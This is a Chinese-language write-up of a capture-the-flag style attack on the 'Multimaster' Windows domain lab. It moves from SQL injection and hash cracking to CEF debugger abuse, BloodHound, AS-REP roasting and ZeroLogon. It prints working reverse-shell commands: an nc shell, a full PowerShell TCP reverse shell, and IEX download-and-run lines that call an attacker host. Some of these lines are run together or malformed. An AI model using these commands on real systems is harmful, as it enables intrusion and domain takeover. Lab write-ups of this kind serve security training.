

# 域渗透实战之Multimaster - 先知社区

域渗透实战之Multimaster

- - -

# 信息收集

## 端口扫描

首先使用nmap去探测存活的端口，发现该主机为一个域主机。

[![](assets/1705974590-702f68060f3177bfb3aac5d2dd963b68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223058-b183ed34-b869-1.png)

[![](assets/1705974590-cd98fda993d4fd9856341dc8118b0d2f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223107-b6d62bda-b869-1.png)

## 网络共享

接着查看其网络共享，未发现其存在网络共享。

[![](assets/1705974590-58eb13c00ae452f884459d09062b0bcb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223116-bc2c0cb2-b869-1.png)

访问80端口，发现一个web网页。

[![](assets/1705974590-50be393b51b1c620867a79539f01913b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223128-c3726e4e-b869-1.png)

接着发现一个登陆框。

[![](assets/1705974590-130507c793bccb73403af17af6b62923.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223135-c77e2e9c-b869-1.png)

发现其页面里面存在延时。

[![](assets/1705974590-4884833280c44741c85c069fb3567550.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223142-cb99d0c6-b869-1.png)

## 目录爆破

使用工具对该网站进行爆破目录。

[![](assets/1705974590-fd83e3736c32b48df33fdaead2925560.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223150-d0c809c8-b869-1.png)

未发现有用的东西。

[![](assets/1705974590-d5f181478942b710d1590c2720cf2517.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223157-d4eb88c2-b869-1.png)

然后使用burp抓包进行测试。

[![](assets/1705974590-20abc5d82940805bbe6d18b52140e239.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223205-d93ede6a-b869-1.png)

# 漏洞利用

## SQL注入

尝试过{"name":{"$ne":"0xdf"}}，返回一个空数组。

[![](assets/1705974590-9d335226acf51a56d6cebc00672124c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223222-e3b9fe60-b869-1.png)

添加Content-Type. 调用了charset=utf-8. 我查了一下字符'，它的 ASCII 十六进制值为 0x27。  
发送\\u27，返回错误：

[![](assets/1705974590-48dde536cba0fbd50a428b27e4e3595d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223231-e93b0032-b869-1.png)

## Dump用户

使用sqlmap来跑数据  
sqlmap -r sqlmap.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch--proxy [http://127.0.0.1:8080](http://127.0.0.1:8080/) --dump-all--exclude-sysdbs

[![](assets/1705974590-9e8c0b762107bf09600190216618c633.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223241-eebb4c6a-b869-1.png)

成功跑出数据库  
sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch--proxy [http://127.0.0.1:8080](http://127.0.0.1:8080/) --dump-all--exclude-sysdbs

[![](assets/1705974590-527cba340cc53b5342103ca4642fda91.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223249-f3fc205a-b869-1.png)

## 破解哈希值

使用hashcat来爆破hash

[![](assets/1705974590-ad5b5d44d0e930bddbd46c62ac4938ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223259-f96b5344-b869-1.png)

## 测试可用用户

使用crackmapexec来检测可用用户

[![](assets/1705974590-a3923c49fe735c46390071dd922b6d34.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223307-fea89f2e-b869-1.png)

## 转储域用户

尝试使用MSSQL 转储域用户

[![](assets/1705974590-d8703b11d6567afa9090f320ada34fa9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223317-046c07fc-b86a-1.png)

## 获取默认域

第一步是获取带有SELECT DEFAULT\_DOMAIN(). 用该查询替换所有静态CHAR以获得：

[![](assets/1705974590-0759f516a825341db11f530a0ae40bdb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223326-09ef789e-b86a-1.png)

## 获取域 RID

使用SUSER\_SID已知组上的函数来获取域 RID

[![](assets/1705974590-5cade2d6274db716e149f0fc88393be1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223333-0e3880ee-b86a-1.png)

## 构建用户 RID

默认管理员是 RID 500。将其填充到 4 字节 (0x000001f4) 并反转字节顺序 (0xf4010000) 来创建此 RID。管理员 RID 是0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000

[![](assets/1705974590-54ec08f576412f08bedccc0f7f60720f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223341-12c869a8-b86a-1.png)

## 脚本爆破

使用脚本爆破

[![](assets/1705974590-d3f1a690b048c916cbccd01d36d1b677.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223350-183216e6-b86a-1.png)

测试域用户密码  
使用crackmapexec来检查域用户的可用性。

[![](assets/1705974590-2fede7ca0e3aaeb23ab1cd731acd9e48.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223400-1dc150e0-b86a-1.png)

成功获得MEGACORP\\tushikikatomo:finance1用户

[![](assets/1705974590-2a361cec9cb421a6ad1eb2c8d3bf8b2b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223407-22670b9e-b86a-1.png)

## WinRM获取shell

使用WinRM 获取shell  
并获取user.txt

[![](assets/1705974590-5d35bc7b154cf13da3b420c5436d421e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223433-31aaea94-b86a-1.png)

# Priv: tushikikatomo –> cyork

## 枚举

目录枚举，查找可用文件。

[![](assets/1705974590-cb4340077363d0e8b6041620b648f023.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223440-36141d26-b86a-1.png)

## CEF调试

```plain
\cefdebug.exe--code"process.version"--url ws://127.0.0.1:63254/3788348a-7950-47f9-a91d-14ee16ffc052
.\cefdebug --code"process.mainModule.require('child_process').exec('whoami > C:\windows\system32\spool\drivers\color\x')"  ws://127.0.0.1:63254/3788348a-7950-47f9-a91d-14ee16ffc052a-b0
1a-629102094b
```

使用cefdebug.exe来进行调试。

[![](assets/1705974590-852a25d9f121487deeb8196341010c56.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223530-53de15d2-b86a-1.png)

```plain
.\cefdebug --code "process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.16.10 443 -e cmd')"--urlws://127.0.0.1:60404/830$client = New-Object 
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.10',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();

.\cefdebug.exe --url ws://127.0.0.1:38802/8dcd4ac7-49f5-4652-9c95-3f0d7766ffc7 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.10/shell.ps1\')')"
```

接着上传nc

[![](assets/1705974590-2e9f8eae568093353a5bb80aac850b9d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223540-598fdf60-b86a-1.png)

## 反弹shell

[![](assets/1705974590-df1d55777be350fc0be4fb35dee22441.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223551-6046be8c-b86a-1.png)

# Priv: cyork –> sbauer

发现一个自定义的 dll 文件，在\\inetpub\\wwwroot\\bin\\目录下

[![](assets/1705974590-8eabea732cdc5ce8eb959c989a2d7574.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223558-644e0b02-b86a-1.png)

```plain
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.174.1:1234/evil.txt','evil.exe')
```

使用 DNSpy逆向之后，获取登录用户名和密码。  
接着进行测试用户

[![](assets/1705974590-3a92bd6515e46a6ed51d38dab970dadd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223606-696284c4-b86a-1.png)

[![](assets/1705974590-87661f01535ce12aad09e7d1488d96e5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223614-6dab9a16-b86a-1.png)

## WinRM

继续使用winrm获取shell

[![](assets/1705974590-99004c5899282b3c9acb3a8e37960540.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223622-72b837bc-b86a-1.png)

# Priv: sbauer –> jordan

## Bloodhound利用

上传SharpHound.exe

[![](assets/1705974590-45a7ff50cad4957021df72bba936bb60.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223629-76da1bc6-b86a-1.png)

## Bloodhound 分析

将其加载到 Bloodhound 中，显示我拥有的三个帐户并将它们标记为此类（右键单击并选择“标记为拥有”）。运行查询“到高价值目标的最短路径

[![](assets/1705974590-0449cd7da6c71800ae54012c1e908b47.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223636-7ae3aaa2-b86a-1.png)

[![](assets/1705974590-714ecc2b47887a89a60f44bd9f7102c0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223645-8078d73a-b86a-1.png)

## Bypass-AMSI

使用Evil-WinRM来进行Bypass AMSI

[![](assets/1705974590-0f95fe754272970548da542575e69e13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223652-84685f00-b86a-1.png)

[![](assets/1705974590-423e5b86d5d63699e10fa19591a1f7b7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223658-87f25cac-b86a-1.png)

## 获取 AS-REP 哈希值

发现NORMAL\_ACCOUNT和DONT\_EXPIRE\_PASSWORD标志：

[![](assets/1705974590-cdf5874731104ed6c1367ada8e921221.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223705-8c32c324-b86a-1.png)

[![](assets/1705974590-d89d210829d1fda71e69f6ab19786f0c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223713-90f4ce66-b86a-1.png)

将它下载到本地，然后进行解密。

[![](assets/1705974590-26d5037a6b418f4dc3af475a88323e32.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223721-95de3c8c-b86a-1.png)

## WinRM获取shell

[![](assets/1705974590-ceb8e4c41e3fba62624b623b88668d36.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223727-9937c772-b86a-1.png)

# 权限提升

## 用户枚举

jorden 属于服务器操作员组：

[![](assets/1705974590-384972f3056236bb73b280fade0042ab.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223733-9cec13d2-b86a-1.png)

## ZeroLogon获取域控权限

发现域内存在CVE-2020-1472  
使用脚本进行尝试，成功获取域管hash

[![](assets/1705974590-123345f915753a9f9ff2f6d3738ca4f1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223740-a122fea2-b86a-1.png)

[![](assets/1705974590-89a09a49f088b631a3a4dc7e233aab39.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223746-a4a9da00-b86a-1.png)

## 获取root.txt

成功获取root.txt

[![](assets/1705974590-2fd2daff797054d8a691f55404d199fb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240121223754-a94f274a-b86a-1.png)
